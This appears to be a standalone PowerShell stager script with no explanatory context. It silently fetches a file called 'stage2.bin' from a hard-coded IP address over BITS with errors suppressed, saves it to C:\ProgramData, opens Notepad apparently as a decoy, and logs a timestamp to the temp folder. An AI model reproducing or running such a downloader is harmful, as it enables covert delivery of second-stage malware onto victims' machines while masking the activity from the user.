$PayloadUrl = "http://203.0.113.250:8080/cdn/stage2.bin"
$OutputPath = "C:\ProgramData\stage2.bin"
Start-BitsTransfer -Source $PayloadUrl -Destination $OutputPath -ErrorAction SilentlyContinue
& 'notepad.exe'
Set-Location -Path $env:TEMP
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
